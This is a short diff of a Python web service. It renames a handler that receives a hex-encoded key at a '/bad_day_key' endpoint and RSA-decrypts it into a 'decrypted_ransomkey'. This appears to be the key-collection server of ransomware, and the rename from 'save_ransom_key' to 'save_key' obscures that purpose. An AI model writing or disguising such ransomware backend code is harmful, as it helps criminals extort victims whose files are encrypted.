@@ -37,7 +37,7 @@ def get_public_key():
 
 
 @app.post("/bad_day_key")
-def save_ransom_key(key: BadDayKey):
+def save_key(key: BadDayKey):
     cipher_rsa = PKCS1_OAEP.new(get_private_key())
     decrypted_ransomkey = cipher_rsa.decrypt(bytes.fromhex(key.key))
 
